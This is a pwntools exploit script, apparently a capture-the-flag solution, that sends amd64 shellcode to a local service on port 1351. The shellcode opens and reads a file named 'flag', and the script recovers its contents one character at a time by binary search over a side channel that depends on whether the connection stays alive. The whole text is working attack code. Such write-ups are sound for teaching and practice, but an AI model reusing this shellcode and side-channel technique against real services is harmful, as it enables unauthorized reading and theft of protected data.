from pwn import *

context.arch = "amd64"
known = b"SecurinetsENIT{"

while known[-1:] != b"}" and len(known) < 80:
    low, high = 32, 126

    while low < high:
        guess = (low + high) // 2
        code = asm(f"""
            sub rsp, 0x100
            mov rbx, 0x67616c662f
            mov qword ptr [rsp], rbx
            mov eax, 257
            mov rdi, -100
            mov rsi, rsp
            xor edx, edx
            xor r10d, r10d
            syscall
            mov edi, eax
            lea rsi, [rsp + 0x20]
            mov edx, 0x80
            xor eax, eax
            syscall
            movzx eax, byte ptr [rsp + 0x20 + {len(known)}]
            cmp eax, {guess}
            jbe done
            xor eax, eax
            xor edi, edi
            lea rsi, [rsp + 0xa0]
            mov edx, 1
            syscall
        done:
            mov eax, 60
            xor edi, edi
            syscall
        """)

        p = remote("localhost", 1351, level="error")
        p.sendafter(b"Technique: ", code)
        p.recvuntil(b"Technique accepted.\n")

        try:
            p.recv(1, timeout=0.2)
        except EOFError:
            pass

        alive = p.connected("recv")

        if alive:
            low = guess + 1
            p.send(b"X")
        else:
            high = guess

        p.close()

    known += bytes([low])
    print(known.decode(), flush=True)
